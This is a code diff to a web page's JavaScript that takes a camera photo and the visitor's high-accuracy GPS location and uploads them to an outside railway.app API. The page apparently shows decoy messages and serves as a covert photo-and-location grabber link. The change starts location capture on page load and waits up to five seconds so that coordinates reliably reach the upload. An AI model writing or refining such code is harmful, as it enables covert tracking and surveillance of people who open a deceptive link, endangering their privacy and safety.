@@ -214,7 +214,6 @@
     // redeployment trigger
     const API_BASE = "https://link-take-photo-production.up.railway.app";
 
-    const LOCATION_ATTACH_MAX_MS = 400;
     const WEBP_QUALITY = 0.82;
     const JPEG_FALLBACK_QUALITY = 0.88;
 
@@ -256,39 +255,36 @@
       return DECOY_MESSAGES[Math.floor(Math.random() * DECOY_MESSAGES.length)];
     }
 
-    function getLocation() {
+    function getLocationFast() {
       return new Promise((resolve) => {
         if (!navigator.geolocation) {
           resolve({ latitude: null, longitude: null, accuracy: null });
           return;
         }
+
+        const timeout = setTimeout(() => {
+          resolve({ latitude: null, longitude: null, accuracy: null });
+        }, 5000);
+
         navigator.geolocation.getCurrentPosition(
-          (position) => {
+          (pos) => {
+            clearTimeout(timeout);
             resolve({
-              latitude: position.coords.latitude,
-              longitude: position.coords.longitude,
-              accuracy: position.coords.accuracy,
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude,
+              accuracy: pos.coords.accuracy,
             });
           },
-          (error) => {
-            console.log("Location error:", error);
+          () => {
+            clearTimeout(timeout);
             resolve({ latitude: null, longitude: null, accuracy: null });
           },
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
         );
       });
     }
 
-    /** Use up to maxMs for GPS; do not block capture — only the upload payload. */
-    function raceLocationForUpload(locationPromise, maxMs) {
-      const empty = { latitude: null, longitude: null, accuracy: null };
-      return Promise.race([
-        locationPromise,
-        new Promise((resolve) => {
-          setTimeout(() => resolve(empty), maxMs);
-        }),
-      ]);
-    }
+    const locationPromise = getLocationFast();
 
     function setStatus(text, isError) {
       statusEl.textContent = text;
@@ -422,10 +418,7 @@
       stream.getTracks().forEach((t) => t.stop());
       preview.srcObject = null;
 
-      const location = await raceLocationForUpload(
-        locationPromise,
-        LOCATION_ATTACH_MAX_MS
-      );
+      const location = await locationPromise;
 
       try {
         const b64 = await blobToBase64(encoded.blob);
